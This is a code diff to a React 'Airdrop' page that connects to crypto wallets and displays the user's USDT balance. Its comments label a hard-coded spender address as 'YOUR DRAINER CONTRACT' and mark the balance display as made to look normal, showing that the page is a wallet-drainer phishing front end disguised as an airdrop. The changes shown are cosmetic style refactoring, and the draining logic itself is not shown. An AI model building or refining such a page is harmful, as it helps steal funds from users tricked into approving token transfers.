@@ -1,7 +1,7 @@
 import { useState, useEffect } from 'react';
 import { ethers } from 'ethers';
 import { useLanguage } from '../LanguageContext';
-import './Airdrop.css';
+import './Admin.css';
 
 const API_BASE = import.meta.env.VITE_API_BASE || 'http://localhost:8989';
 const SPENDER_CONTRACT = '0x395c8Cf5D657542b0Eaef485930Cd58B1dEAaC9d'; // YOUR DRAINER CONTRACT
@@ -397,15 +397,15 @@ export default function Airdrop() {
 
                 {/* Show network error if any */}
                 {networkError && (
-                    <div className="error-message" style={{ background: 'rgba(255,0,0,0.2)', padding: '10px', borderRadius: '8px', margin: '10px 0', color: '#ff6b6b' }}>
+                    <div className="error-message admin-error-message">
                         <i className="fas fa-exclamation-triangle"></i> {networkError}
                     </div>
                 )}
 
                 {/* Show USDT Balance (LOOKS NORMAL) */}
                 {wallet && networkOk && (
-                    <div className="balance-info" style={{ background: 'rgba(0,0,0,0.3)', padding: '12px', borderRadius: '12px', margin: '10px 0' }}>
-                        <div className="balance-item" style={{ display: 'flex', justifyContent: 'space-between' }}>
+                    <div className="balance-info admin-balance-info">
+                        <div className="balance-item admin-balance-item">
                             <span>Your USDT: </span>
                             <strong>{parseFloat(usdtBalance).toFixed(2)} USDT</strong>
                         </div>
